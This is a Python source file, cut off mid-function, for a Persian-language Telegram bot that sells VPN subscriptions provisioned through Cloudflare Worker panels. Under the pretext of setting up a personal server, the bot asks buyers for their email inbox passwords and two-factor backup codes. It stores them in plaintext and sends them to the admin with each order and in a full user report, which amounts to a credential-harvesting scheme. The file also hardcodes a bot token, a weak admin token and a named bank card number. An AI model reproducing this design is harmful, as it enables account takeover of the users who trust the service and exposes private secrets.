import telebot
from telebot import types
import sqlite3
import time
import datetime
import jdatetime
import requests
from urllib.parse import urlparse
from io import BytesIO
from PIL import Image

# ================= تنظیمات اصلی =================
TOKEN = '8452962087:AAH-WX6MIxTuBNj0YS6YkrwhMjlavT-9uaU'
ADMIN_ID = 8081586840  # آیدی عددی ادمین
CARD_NUMBER = "6037-9973-7667-2938 بنام علی فرجی"
SUPPORT_ID = "@mrpcdesigner" 

PIC_UPDATE_SUB = "https://example.com/update_sub_tutorial.jpg" 
PIC_V2BOX_SETUP = "https://example.com/v2box_setup_tutorial.jpg"

CF_ADMIN_PATH = "my-secret-admin-9988"
CF_ADMIN_TOKEN = "admin12345"

bot = telebot.TeleBot(TOKEN)

# ================= دیتابیس =================
conn = sqlite3.connect('vpn_bot.db', check_same_thread=False)
cursor = conn.cursor()

# جدول اصلی کاربران
cursor.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY, last_test_date TEXT, join_date_shamsi TEXT)''')

# جدول ایمیل‌های کاربران
cursor.execute('''CREATE TABLE IF NOT EXISTS user_emails
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                   user_id INTEGER, 
                   email TEXT UNIQUE, 
                   password TEXT, 
                   description TEXT)''')

# جدول سرویس‌ها
cursor.execute('''CREATE TABLE IF NOT EXISTS services
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                   plan_days INTEGER, plan_type TEXT, cf_domain TEXT, 
                   exp_date TEXT, status TEXT, purchase_date_shamsi TEXT)''')

# جدول ذخیره دامنه‌های ادمین
cursor.execute('''CREATE TABLE IF NOT EXISTS admin_domains
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT UNIQUE)''')

conn.commit()
user_states = {}

# ================= توابع کمکی =================
def get_shamsi_now():
    """دریافت تاریخ و ساعت دقیق شمسی"""
    return jdatetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")

# ================= متن‌های راهنما =================
EMAIL_PROMPT = """
📧 <b>ثبت ایمیل جدید در سیستم:</b>

برای اینکه بتوانیم سرور شخصی و اختصاصی شما را بسازیم، به یک ایمیل نیاز داریم. 
شما فقط یک بار این ایمیل را ثبت می‌کنید و در دفعات بعدی تنها با یک کلیک می‌توانید آن را انتخاب کنید.

⚠️ <b>نکات مهم:</b>
۱. ایمیل باید <b>واقعی</b> و در دسترس شما باشد.
۲. این ایمیل نباید قبلاً توسط شخص دیگری در سیستم ما ثبت شده باشد.

✍️ لطفاً آدرس ایمیل جدید خود را ارسال کنید:
"""

# ================= کیبوردها =================
def main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(
        types.KeyboardButton("🎁 دریافت اکانت رایگان (تست)"), 
        types.KeyboardButton("🛒 خرید سرویس")                
    )
    markup.row(
        types.KeyboardButton("📚 آموزش‌ها"),                 
        types.KeyboardButton("📞 ارتباط با پشتیبانی")         
    )
    if user_id == ADMIN_ID:
        markup.add(types.KeyboardButton("⚙️ ورود به پنل مدیریت حرفه‌ای"))
    return markup

def admin_panel_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(
        types.KeyboardButton("👥 لیست کامل کاربران و خریدها"),
        types.KeyboardButton("🔙 بازگشت به پنل کاربری")
    )
    return markup

def back_and_support_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("📞 ارتباط با پشتیبانی"),
        types.KeyboardButton("🔙 بازگشت به منوی اصلی")
    )
    return markup

def tutorials_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(
        types.KeyboardButton("🔄 آموزش آپدیت کردن لینک (بروزرسانی)"),
        types.KeyboardButton("🚀 آموزش راه‌اندازی در V2Box"),
        types.KeyboardButton("🔙 بازگشت به منوی اصلی")
    )
    return markup

def days_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    # تلگرام دکمه‌های Inline را از چپ به راست می‌چیند
    markup.row(
        types.InlineKeyboardButton("۵ روزه", callback_data="plan_5"),   # چپ
        types.InlineKeyboardButton("۱ روزه", callback_data="plan_1")    # راست
    )
    markup.row(
        types.InlineKeyboardButton("۳۰ روزه", callback_data="plan_30"), # پایین چپ
        types.InlineKeyboardButton("۱۰ روزه", callback_data="plan_10")  # پایین راست
    )
    markup.row(
        types.InlineKeyboardButton("۶۰ روزه", callback_data="plan_60")  # آخری
    )
    return markup

def users_count_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("👤 یک کاربره", callback_data="users_1"),
        types.InlineKeyboardButton("👥 چند کاربره", callback_data="users_multi")
    )
    return markup

def select_email_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    cursor.execute("SELECT id, email, description FROM user_emails WHERE user_id=?", (user_id,))
    emails = cursor.fetchall()
    
    for e in emails:
        desc_snippet = e[2][:15] + "..." if e[2] and len(e[2]) > 15 else (e[2] if e[2] else "بدون توضیحات")
        markup.add(types.InlineKeyboardButton(f"✅ {e[1]} ({desc_snippet})", callback_data=f"usemail_{e[0]}"))
    
    markup.add(types.InlineKeyboardButton("➕ افزودن ایمیل جدید", callback_data="add_new_email"))
    
    if emails:
        markup.add(types.InlineKeyboardButton("✏️ مدیریت / ویرایش ایمیل‌ها", callback_data="manage_emails"))
    
    return markup

def manage_emails_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    cursor.execute("SELECT id, email FROM user_emails WHERE user_id=?", (user_id,))
    emails = cursor.fetchall()
    for e in emails:
        markup.add(types.InlineKeyboardButton(f"ویرایش: {e[1]}", callback_data=f"editemail_{e[0]}"))
    markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="back_to_email_select"))
    return markup

def edit_single_email_keyboard(email_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("تغییر پسورد", callback_data=f"editpass_{email_id}"),
        types.InlineKeyboardButton("تغییر توضیحات", callback_data=f"editdesc_{email_id}")
    )
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="manage_emails"))
    return markup

# ================= توابع ارتباطی با سرور کلودفلر =================
def update_cloudflare_exp(domain, days_to_add, hours_to_add=0, single_user=False):
    exp_datetime = datetime.datetime.now() + datetime.timedelta(days=int(days_to_add), hours=int(hours_to_add))
    date_str = exp_datetime.strftime("%Y-%m-%d")
    time_str = exp_datetime.strftime("%H:%M")
    
    if domain.endswith('/'):
        domain = domain[:-1]
        
    url = f"{domain}/{CF_ADMIN_PATH}?token={CF_ADMIN_TOKEN}"
    
    try:
        # ۱. ابتدا وضعیت فعلی کانفیگ را از ورکر دریافت می‌کنیم
        res = requests.post(url, json={"action": "getData"}, timeout=15)
        if res.status_code == 200:
            current_data = res.json().get("data", {})
            
            # ۲. در صورتی که Kill Switch روشن بود، آن را خاموش می‌کنیم
            if current_data.get("killSwitch") == True:
                requests.post(url, json={"action": "toggleKillSwitch"}, timeout=15)
            
            # ۳. وضعیت تک‌کاربره را چک کرده و اگر با نوع خرید متفاوت بود تغییر می‌دهیم
            is_currently_single = current_data.get("singleUser", False)
            if bool(is_currently_single) != bool(single_user):
                requests.post(url, json={"action": "toggleUser"}, timeout=15)
                
        # ۴. در نهایت تاریخ انقضای جدید را ثبت می‌کنیم
        payload = {
            "action": "updateExp", 
            "date": date_str, 
            "time": time_str
        }
        response = requests.post(url, json=payload, timeout=15)
        if response.status_code == 200:
            data = response.json()
            sub_link = data.get("subLink", f"{domain}/sub")
            return True, sub_link
        return False, ""
    except Exception as e:
        print(f"Error connecting to panel: {e}")
        return False, ""

# ================= هندلرهای اصلی و منوها =================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_states.pop(message.from_user.id, None)
    join_shamsi = get_shamsi_now()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, join_date_shamsi) VALUES (?, ?)", (message.from_user.id, join_shamsi))
    conn.commit()
    
    welcome_text = """
👋 **به ربات هوشمند ما خوش آمدید!**

💡 **هدیه ویژه ما:** کاربران جدید برای بار اول یک اکانت **تست ۲ روزه (تک‌کاربره)** رایگان دریافت می‌کنند. همچنین تمامی کاربران می‌توانند **هر ماه یکبار، یک اکانت رایگان ۱ روزه** دریافت کنند!

پایداری، سرعت و امنیت را با ما تجربه کنید. لطفاً از منوی زیر یک گزینه را انتخاب کنید 👇
"""
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu(message.from_user.id), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "🔙 بازگشت به منوی اصلی" or m.text == "🔙 بازگشت به پنل کاربری")
def go_back(message):
    user_states.pop(message.from_user.id, None)
    bot.send_message(message.chat.id, "🏠 به منوی اصلی برگشتید. چه کاری می‌توانم برایتان انجام دهم؟", reply_markup=main_menu(message.from_user.id))

# === پنل ادمین ===
@bot.message_handler(func=lambda m: m.text == "⚙️ ورود به پنل مدیریت حرفه‌ای" and m.from_user.id == ADMIN_ID)
def admin_panel_enter(message):
    bot.send_message(message.chat.id, "👨‍💻 **به پنل مدیریت حرفه‌ای خوش آمدید.**\nاز گزینه‌های زیر استفاده کنید:", reply_markup=admin_panel_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👥 لیست کامل کاربران و خریدها" and m.from_user.id == ADMIN_ID)
def admin_users_list(message):
    cursor.execute('SELECT user_id, join_date_shamsi FROM users ORDER BY user_id DESC')
    users = cursor.fetchall()
    
    if not users:
        bot.reply_to(message, "هیچ کاربری در دیتابیس ثبت نشده است.")
        return
        
    text_chunk = "👥 <b>گزارش جامع تمام کاربران:</b>\n\n"
    for u in users:
        user_id = u[0]
        join_date = u[1] if u[1] else "نامشخص"
        
        # استخراج اطلاعات ایمیل‌ها
        cursor.execute("SELECT email, password, description FROM user_emails WHERE user_id=?", (user_id,))
        emails = cursor.fetchall()
        email_text = ""
        if emails:
            for e in emails:
                email_text += f"   📧 <code>{e[0]}</code>\n   🔑 پسورد: <code>{e[1]}</code>\n   📝 <i>{e[2]}</i>\n\n"
        else:
            email_text = "   - اطلاعاتی ثبت نکرده\n\n"
            
        # استخراج تاریخچه سرویس‌ها (اکانت تست و خریدها)
        cursor.execute("SELECT plan_days, plan_type, cf_domain, purchase_date_shamsi FROM services WHERE user_id=? ORDER BY id ASC", (user_id,))
        services = cursor.fetchall()
        service_text = ""
        if services:
            for s in services:
                service_text += f"   🛍 <b>{s[0]} روزه ({s[1]})</b>\n   🌐 <b>ورکر:</b> <code>{s[2]}</code>\n   📅 <b>تاریخ:</b> {s[3]}\n   ---\n"
        else:
            service_text = "   - خرید یا تستی نداشته\n"
            
        user_info = f"""👤 <b>کاربر:</b> <a href="tg://user?id={user_id}">{user_id}</a>
📅 <b>عضویت:</b> {join_date}

🔐 <b>اطلاعات ورود (ایمیل‌ها):</b>
{email_text}📦 <b>تاریخچه خریدهـا و تـست‌ها:</b>
{service_text}➖➖➖➖➖➖➖➖\n"""
        
        # جلوگیری از خطای طولانی شدن پیام تلگرام
        if len(text_chunk) + len(user_info) > 3800:
            bot.send_message(ADMIN_ID, text_chunk, parse_mode="HTML")
            text_chunk = user_info
            time.sleep(0.3)
        else:
            text_chunk += user_info
            
    if text_chunk:
        bot.send_message(ADMIN_ID, text_chunk, parse_mode="HTML")

# === آموزش و پشتیبانی ===
@bot.message_handler(func=lambda m: m.text in ["📚 آموزش‌ها", "🔄 آموزش آپدیت کردن لینک (بروزرسانی)", "🚀 آموزش راه‌اندازی در V2Box", "📞 ارتباط با پشتیبانی"])
def side_menus(message):
    if message.text == "📚 آموزش‌ها":
        bot.send_message(message.chat.id, "کدام آموزش را نیاز دارید؟ 👇", reply_markup=tutorials_menu())
    elif message.text == "🔄 آموزش آپدیت کردن لینک (بروزرسانی)":
        try: bot.send_photo(message.chat.id, PIC_UPDATE_SUB, caption="🖼 برای دریافت بهترین سرعت و پینگ، همیشه لینک خود را طبق این عکس آپدیت کنید.")
        except: bot.send_message(message.chat.id, "لینک عکس آموزشی تنظیم نشده است.")
    elif message.text == "🚀 آموزش راه‌اندازی در V2Box":
        try: bot.send_photo(message.chat.id, PIC_V2BOX_SETUP, caption="🖼 مراحل وارد کردن لینک در برنامه V2Box طبق این عکس می‌باشد.")
        except: bot.send_message(message.chat.id, "لینک عکس آموزشی تنظیم نشده است.")
    elif message.text == "📞 ارتباط با پشتیبانی":
        bot.send_message(message.chat.id, f"👨‍💻 تیم پشتیبانی ما همیشه پاسخگوی شماست.\n\nبرای ارتباط مستقیم به آیدی زیر پیام دهید:\n{SUPPORT_ID}")

# === شروع خرید و تست ===
@bot.message_handler(func=lambda m: m.text == "🛒 خرید سرویس")
def handle_buy_service(message):
    rules_text = "⚠️ <b>قوانین سرویس:</b>\nسرویس‌های ما کاملاً نامحدود هستند، اما شامل قانون مصرف منصفانه می‌شوند. در صورت مصرف غیرعادی، اکانت موقتاً قطع شده و از روز بعد متصل می‌گردد.\n\n⏳ لطفاً مدت زمان سرویس خود را انتخاب کنید:"
    bot.send_message(message.chat.id, rules_text, reply_markup=days_keyboard(), parse_mode="HTML")
    bot.send_message(message.chat.id, "در هر مرحله می‌توانید با استفاده از منوی زیر انصراف دهید:", reply_markup=back_and_support_keyboard())

@bot.message_handler(func=lambda m: m.text == "🎁 دریافت اکانت رایگان (تست)")
def handle_test_account(message):
    user_id = message.from_user.id
    cursor.execute("SELECT last_test_date FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    
    is_first_time = True
    if row and row[0]: 
        last_test = datetime.datetime.strptime(row[0], "%Y-%m-%d")
        if (datetime.datetime.now() - last_test).days < 30:
            bot.send_message(user_id, "❌ شما در این ماه اکانت رایگان خود را دریافت کرده‌اید. \nشما **ماهی یک بار** مجاز به دریافت اکانت تست ۱ روزه هستید.", parse_mode="Markdown")
            return
        is_first_time = False
            
    if is_first_time:
        test_days = 2
        bot.send_message(user_id, "🎁 **مژده:** چون بار اول شماست، یک اکانت تست **۲ روزه (کاملاً تک‌کاربره)** به شما تعلق می‌گیرد!\n(برای ماه‌های آینده، هدیه شما ۱ روزه خواهد بود)", parse_mode="Markdown")
    else:
        test_days = 1
        bot.send_message(user_id, "🎁 اکانت هدیه ماهانه شما (**۱ روزه و تک‌کاربره**) در حال آماده‌سازی است...", parse_mode="Markdown")
        
    user_states[user_id] = {'days': test_days, 'hours': 0, 'type': f'اکانت تست ({test_days} روزه - تک‌کاربره)', 'is_test': True}
    bot.send_message(user_id, "لطفاً ایمیلی که می‌خواهید سرویس روی آن فعال شود را انتخاب کنید:", reply_markup=select_email_keyboard(user_id))
    bot.send_message(user_id, "یا برای لغو عملیات از دکمه بازگشت استفاده کنید:", reply_markup=back_and_support_keyboard())

# === ادامه خرید ===
@bot.callback_query_handler(func=lambda call: call.data.startswith('plan_'))
def handle_plan_selection(call):
    days = call.data.split('_')[1]
    user_states[call.from_user.id] = {'days': days, 'hours': 0, 'is_test': False}
    bot.edit_message_text("👥 نوع مصرف را مشخص کنید:", call.message.chat.id, call.message.message_id, reply_markup=users_count_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith('users_'))
def handle_users_count(call):
    user_id = call.from_user.id
    user_type = call.data.split('_')[1]
    user_states[user_id]['type'] = "یک کاربره" if user_type == '1' else "چند کاربره"
    
    bot.edit_message_text("📧 لطفاً ایمیل مورد نظر خود را برای فعال‌سازی این سرویس انتخاب کنید:", 
                          call.message.chat.id, call.message.message_id, reply_markup=select_email_keyboard(user_id))

# ================= مدیریت ایمیل‌ها توسط کاربر =================
@bot.callback_query_handler(func=lambda call: call.data == "back_to_email_select")
def back_to_email_select(call):
    bot.edit_message_text("لطفاً ایمیل مورد نظر خود را انتخاب کنید:", 
                          call.message.chat.id, call.message.message_id, reply_markup=select_email_keyboard(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "add_new_email")
def add_new_email_start(call):
    user_id = call.from_user.id
    user_states[user_id]['state'] = 'WAIT_NEW_EMAIL'
    bot.delete_message(call.message.chat.id, call.message.message_id)
    bot.send_message(call.message.chat.id, EMAIL_PROMPT, reply_markup=back_and_support_keyboard(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.from_user.id in user_states and user_states[m.from_user.id].get('state') == 'WAIT_NEW_EMAIL')
def wait_new_email(message):
    user_id = message.from_user.id
    new_email = message.text.strip()
    
    cursor.execute("SELECT id FROM user_emails WHERE email=?", (new_email,))
    if cursor.fetchone():
        bot.send_message(user_id, "❌ این ایمیل قبلاً در سیستم ثبت شده است. لطفاً ایمیل دیگری وارد کنید:", reply_markup=back_and_support_keyboard())
        return
        
    user_states[user_id]['temp_email'] = new_email
    user_states[user_id]['state'] = 'WAIT_NEW_PASS'
    bot.send_message(user_id, "🔑 لطفاً <b>پسورد ورود به اینباکس</b> این ایمیل را با دقت وارد کنید:", parse_mode="HTML", reply_markup=back_and_support_keyboard())

@bot.message_handler(func=lambda m: m.from_user.id in user_states and user_states[m.from_user.id].get('state') == 'WAIT_NEW_PASS')
def wait_new_pass(message):
    user_id = message.from_user.id
    user_states[user_id]['temp_pass'] = message.text.strip()
    user_states[user_id]['state'] = 'WAIT_NEW_DESC'
    
    desc_prompt = """
🔐 <b>امنیت ورود به ایمیل:</b>

برای ورود به اینباکس شما جهت انجام تنظیمات، معمولاً نیاز به تایید دو مرحله‌ای (پیامک، Authenticator یا کدهای بکاپ) است.

لطفاً دقیقاً توضیح دهید که برای ورود به این ایمیل چه کار خاصی باید انجام دهیم؟
<i>(توصیه ما: اگر کد بکاپ/یکبار مصرف دارید، حتماً چند مورد را اینجا بنویسید تا فرآیند فعال‌سازی شما بدون معطلی و در سریع‌ترین زمان انجام شود.)</i>
"""
    bot.send_message(user_id, desc_prompt, parse_mode="HTML", reply_markup=back_and_support_keyboard())

@bot.message_handler(func=lambda m: m.from_user.id in user_states and user_states[m.from_user.id].get('state') == 'WAIT_NEW_DESC')
def wait_new_desc(message):
    user_id = message.from_user.id
    desc = message.text.strip()
    
    cursor.execute("INSERT INTO user_emails (user_id, email, password, description) VALUES (?, ?, ?, ?)",
                   (user_id, user_states[user_id]['temp_email'], user_states[user_id]['temp_pass'], desc))
    conn.commit()
    new_email_id = cursor.lastrowid
    
    bot.send_message(user_id, "✅ ایمیل شما با موفقیت در سیستم ذخیره شد!")
    process_selected_email(message.chat.id, user_id, new_email_id)

@bot.callback_query_handler(func=lambda call: call.data == "manage_emails")
def manage_emails_list(call):
    bot.edit_message_text("کدام ایمیل را می‌خواهید ویرایش کنید؟", call.message.chat.id, call.message.message_id, reply_markup=manage_emails_keyboard(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('editemail_'))
def edit_single_email(call):
    email_id = call.data.split('_')[1]
    bot.edit_message_text("چه تغییری می‌خواهید انجام دهید؟", call.message.chat.id, call.message.message_id, reply_markup=edit_single_email_keyboard(email_id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('editpass_') or call.data.startswith('editdesc_'))
def ask_for_edit_value(call):
    action, email_id = call.data.split('_')
    user_states[call.from_user.id]['edit_email_id'] = email_id
    
    bot.delete_message(call.message.chat.id, call.message.message_id)
    if action == 'editpass':
        user_states[call.from_user.id]['state'] = 'WAIT_EDIT_PASS'
        bot.send_message(call.message.chat.id, "🔑 لطفاً پسورد جدید را وارد کنید:", reply_markup=back_and_support_keyboard())
    else:
        user_states[call.from_user.id]['state'] = 'WAIT_EDIT_DESC'
        bot.send_message(call.message.chat.id, "📝 لطفاً توضیحات جدید (کدهای بکاپ یا نحوه ورود) را وارد کنید:", reply_markup=back_and_support_keyboard())

@bot.message_handler(func=lambda m: m.from_user.id in user_states and user_states[m.from_user.id].get('state') in ['WAIT_EDIT_PASS', 'WAIT_EDIT_DESC'])
def process_edit_value(message):
    user_id = message.from_user.id
    state = user_states[user_id]['state']
    email_id = user_states[user_id]['edit_email_id']
    new_value = message.text.strip()
    
    if state == 'WAIT_EDIT_PASS':
        cursor.execute("UPDATE user_emails SET password=? WHERE id=? AND user_id=?", (new_value, email_id, user_id))
    else:
        cursor.execute("UPDATE user_emails SET description=? WHERE id=? AND user_id=?", (new_value, email_id, user_id))
    conn.commit()
    
    user_states[user_id]['state'] = None
    bot.send_message(user_id, "✅ تغییرات با موفقیت ذخیره شد. حالا می‌توانید ایمیل خود را برای سرویس انتخاب کنید:", reply_markup=select_email_keyboard(user_id))

# ================= انتخاب نهایی ایمیل و رفتن به پرداخت =================
@bot.callback_query_handler(func=lambda call: call.data.startswith('usemail_'))
def handle_existing_email_selection(call):
    email_id = call.data.split('_')[1]
    process_selected_email(call.message.chat.id, call.from_user.id, email_id)

def process_selected_email(chat_id, user_id, email_id):
    cursor.execute("SELECT email, password, description FROM user_emails WHERE id=?", (email_id,))
    row = cursor.fetchone()
    
    user_states[user_id]['selected_email_id'] = email_id
    user_states[user_id]['selected_email'] = row[0]
    user_states[user_id]['selected_password'] = row[1]
    user_states[user_id]['selected_desc'] = row[2]
    
    if user_states[user_id].get('is_test'):
        confirm_test_request(chat_id, user_id, email_id)
    else:
        send_payment_info(chat_id, user_id)

def confirm_test_request(chat_id, user_id, email_id):
    info = user_states[user_id]
    
    caption = f"""🎁 <b>درخواست {info['type']}</b>
👤 آیدی کاربر: <code>{user_id}</code>

📧 <b>ایمیل:</b> <code>{info['selected_email']}</code>
🔑 <b>پسورد:</b> <code>{info['selected_password']}</code>
📝 <b>توضیحات:</b>
{info['selected_desc']}"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✏️ ویرایش اطلاعات کاربر", callback_data=f"admedit_{email_id}"))
    markup.add(types.InlineKeyboardButton("✅ تایید نهایی و ارسال لینک تست", callback_data=f"admaprv_test_{user_id}_{info['days']}_0_1"))
    
    bot.send_message(ADMIN_ID, caption, reply_markup=markup, parse_mode="HTML")
    bot.send_message(chat_id, "✅ درخواست شما ثبت شد. به زودی تنظیمات انجام شده و لینک تست از طرف پشتیبانی برای شما ارسال می‌گردد.", reply_markup=main_menu(user_id))

def send_payment_info(chat_id, user_id):
    info = user_states[user_id]
    text = f"""💳 <b>فاکتور سرویس {info['days']} روزه ({info['type']})</b>

📧 ایمیل انتخابی: {info['selected_email']}

لطفاً مبلغ سرویس را به شماره کارت زیر واریز کرده و <b>عکس رسید تراکنش</b> را همینجا ارسال کنید:

💳 <code>{CARD_NUMBER}</code>

⏱ <i>شما ۱۰ دقیقه برای ارسال رسید فرصت دارید.</i>"""
    
    bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=back_and_support_keyboard())
    user_states[user_id]['state'] = 'WAIT_RECEIPT'
    user_states[user_id]['timer_start'] = time.time()

# === دریافت عکس رسید ===
@bot.message_handler(content_types=['photo'], func=lambda m: m.from_user.id in user_states and user_states[m.from_user.id].get('state') == 'WAIT_RECEIPT')
def process_receipt(message):
    user_id = message.from_user.id
    
    if time.time() - user_states[user_id]['timer_start'] > 600:
        bot.send_message(user_id, "❌ زمان ۱۰ دقیقه‌ای شما برای پرداخت به پایان رسیده است. لطفاً فرآیند خرید را مجدداً آغاز کنید.", reply_markup=main_menu(user_id))
        user_states.pop(user_id, None)
        return

    bot.send_message(user_id, "⏳ رسید شما دریافت شد. در حال فشرده‌سازی و ارسال برای تیم پشتیبانی...", reply_markup=main_menu(user_id))
    
    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    img = Image.open(BytesIO(downloaded_file))
    output_io = BytesIO()
    img.save(output_io, format='JPEG', optimize=True, quality=40)
    output_io.seek(0)
    
    info = user_states[user_id]
    email_id = info['selected_email_id']
    
    caption = f"""🧾 <b>درخواست پرداخت جدید</b>
👤 آیدی: <code>{user_id}</code>
📅 <b>زمان ثبت:</b> {get_shamsi_now()}
📦 پلن: {info['days']} روزه - {info['type']}

📧 <b>ایمیل:</b> <code>{info['selected_email']}</code>
🔑 <b>پسورد:</b> <code>{info['selected_password']}</code>
📝 <b>توضیحات:</b>
{info['selected_desc']}"""
    
    is_single_user = '1' if 'یک کاربره' in info['type'] else '0'
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("✏️ ویرایش اطلاعات (پسورد/توضیحات)", callback_data=f"admedit_{email_id}"))
    markup.add(types.InlineKeyboardButton("✅ تایید پرداختی و ساخت لینک", callback_data=f"admaprv_buy_{user_id}_{info['days']}_0_{is_single_user}"))
    markup.add(types.InlineKeyboardButton("❌ رد کردن پرداخت", callback_data=f"admrej_{user_id}"))
    
    bot.send_photo(ADMIN_ID, output_io, caption=caption, reply_markup=markup, parse_mode="HTML")
    bot.send_message(user_id, "✅ رسید شما تأیید اولیه شد. به محض بررسی نهایی پشتیبانی، لینک سرور اختصاصی شما ارسال خواهد شد.")
    user_states.pop(user_id, None)

# ================= پنل تایید و ویرایش ادمین =================
@bot.callback_query_handler(func=lambda call: call.data.startswith('admrej_'))
def admin_reject_payment(call):
    if call.from_user.id != ADMIN_ID: return
    user_id = call.data.split('_')[1]
    bot.edit_message_caption(caption=call.message.caption + "\n\n❌ <b>توسط شما رد شد.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
    try:
        bot.send_message(user_id, "❌ متاسفانه رسید پرداختی شما توسط بخش مالی تایید نشد. در صورت بروز مشکل با پشتیبانی در ارتباط باشید.")
    except: pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('admedit_'))
def admin_edit_user_email_data(call):
    if call.from_user.id != ADMIN_ID: return
    email_id = call.data.split('_')[1]
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("تغییر پسورد", callback_data=f"adm_epass_{email_id}"),
        types.InlineKeyboardButton("تغییر توضیحات", callback_data=f"adm_edesc_{email_id}")
    )
    bot.send_message(ADMIN_ID, "کدام بخش از اطلاعات این کاربر را می‌خواهید ویرایش کنید؟", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('adm_epass_') or call.data.startswith('adm_edesc_'))
def admin_ask_edit_value(call):
    if call.from_user.id != ADMIN_ID: return
    action, email_id = call.data.split('_')[1], call.data.split('_')[2]
    
    msg = bot.send_message(ADMIN_ID, f"لطفا {'پسورد' if action == 'epass' else 'توضیحات'} جدید را برای این ایمیل تایپ کنید:")
    bot.register_next_step_handler(msg, admin_save_edit_value, action, email_id)

def admin_save_edit_value(message, action, email_id):
    new_val = message.text.strip()
    if action == 'epass':
        cursor.execute("UPDATE user_emails SET password=? WHERE id=?", (new_val, email_id))
    else:
        cursor.execute("UPDATE user_emails SET description=? WHERE id=?", (new_val, email_id))
    conn.commit()
    bot.send_message(ADMIN_ID, "✅ اطلاعات کاربر با موفقیت ویرایش شد. حالا میتوانید از پیام اصلی، تایید و ساخت لینک را بزنید.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admaprv_'))
def admin_approve_and_select_domain(call):
    if call.from_user.id != ADMIN_ID: return
    
    parts = call.data.split('_')
    action = parts[1]
    target_user_id = parts[2]
    days = parts[3]
    hours = parts[4]
    user_type = parts[5] if len(parts) > 5 else '1' 
    
    user_states[ADMIN_ID] = {'state': 'WAIT_DOMAIN', 'target_user': target_user_id, 'days': days, 'hours': hours, 'action': action, 'user_type': user_type}
    
    cursor.execute("SELECT id, domain FROM admin_domains ORDER BY id DESC LIMIT 5")
    saved_domains = cursor.fetchall()
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for d in saved_domains:
        markup.add(types.InlineKeyboardButton(d[1], callback_data=f"admsel_{d[0]}"))
        
    admin_msg = """🔗 لطفاً **آدرس دامنه ورکر (لینک اصلی)** را انتخاب یا ارسال کنید.

⚡️ پیشنهاد می‌شود از دامنه‌های ذخیره شده زیر استفاده کنید:"""
    
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup if saved_domains else None, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admsel_'))
def admin_select_saved_domain(call):
    if call.from_user.id != ADMIN_ID: return
    domain_id = call.data.split('_')[1]
    cursor.execute("SELECT domain FROM admin_domains WHERE id=?", (domain_id,))
    res = cursor.fetchone()
    if res:
        bot.edit_message_text(f"⏳ در حال اعمال تنظیمات روی دامنه:\n{res[0]}", call.message.chat.id, call.message.message_id)
        process_admin_domain_logic(res[0])
    else:
        bot.answer_callback_query(call.id, "دامنه یافت نشد.")

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and user_states.get(ADMIN_ID, {}).get('state') == 'WAIT_DOMAIN')
def setup_service_and_cf(message):
    process_admin_domain_logic(message.text.strip())

def process_admin_domain_logic(domain_input):
    admin_info = user_states.get(ADMIN_ID)
    if not admin_info: return
    
    target_user = admin_info['target_user']
    days = int(admin_info['days'])
    hours = int(admin_info['hours'])
    action = admin_info['action']
    is_single_user = (admin_info.get('user_type', '1') == '1')
    
    if not domain_input.startswith('http'):
        domain_input = 'https://' + domain_input
        
    try:
        parsed_url = urlparse(domain_input)
        domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
        if not parsed_url.netloc:
            raise ValueError
    except:
        bot.send_message(ADMIN_ID, "❌ دامنه ارسالی معتبر نیست. لطفاً مجدداً آدرس صحیح را ارسال کنید.")
        user_states.pop(ADMIN_ID, None) 
        return
        
    bot.send_message(ADMIN_ID, "⏳ در حال برقراری ارتباط با ورکر، اعمال تنظیمات و استخراج لینک سابسکریپشن...")
    
    cf_success, sub_link = update_cloudflare_exp(domain, days, hours, is_single_user)
    
    if cf_success and sub_link:
        cursor.execute("INSERT OR IGNORE INTO admin_domains (domain) VALUES (?)", (domain,))
        
        shamsi_now = get_shamsi_now()
